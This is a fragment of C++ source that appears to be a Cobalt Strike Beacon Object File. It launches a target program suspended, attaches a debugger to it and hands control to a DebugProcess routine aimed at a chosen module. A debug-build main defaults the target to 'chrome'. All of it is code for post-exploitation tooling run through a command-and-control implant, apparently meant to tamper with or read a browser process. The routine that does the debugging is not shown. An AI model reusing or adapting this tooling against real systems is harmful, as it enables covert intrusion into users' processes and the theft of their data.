        PROCESS_INFORMATION pi;

        DFR_LOCAL(KERNEL32, CreateProcessW);

        // Start a new instance suspended
        if (!CreateProcessW(targetExecutable, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
            BeaconPrintf(CALLBACK_ERROR, "%s Failed to create process. Error: %d\n", targetExecutable, GetLastError());
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully created suspended process with PID: %d\n", pi.dwProcessId);

        // Resume the thread to start execution
        DWORD resumeResult = ResumeThread(pi.hThread);
        if (resumeResult == (DWORD)-1) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to resume thread. Error: %d\n", GetLastError());
            return ;
        }
        else {
            BeaconPrintf(CALLBACK_OUTPUT, "Thread resumed successfully.\n");

            DFR_LOCAL(KERNEL32, DebugActiveProcess);
            // Attach the debugger to the new process
            if (DebugActiveProcess(pi.dwProcessId)) {

                BeaconPrintf(CALLBACK_OUTPUT, "Debugger attached to process with PID: %d\n", pi.dwProcessId);
                DebugProcess(pi.hProcess, pi.hThread, targetModule, wait, useHW, useTL32);
            }
            else {
                BeaconPrintf(CALLBACK_ERROR, "DebugActiveProcess failed to attach. Error: %d\n", GetLastError());
                return;
            }
        }

        // Clean up
        BeaconPrintf(CALLBACK_OUTPUT, "Terminating the spawned process\n");

        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);

        BeaconPrintf(CALLBACK_OUTPUT, "Done\n");
        return;
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG)

int main(int argc, char* argv[]) {
    bof::mock::BofData data;
    data.pack<const char*, short, short, short, int, const wchar_t*, const wchar_t*>(
        "chrome",
        false,
        false,
        false,
        500,
        L"",
        L""
    );
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    //bof::runMocked<int, short, int, const char*>(go data);
    go(data.get(), data.size());
    return 0;
}
#endif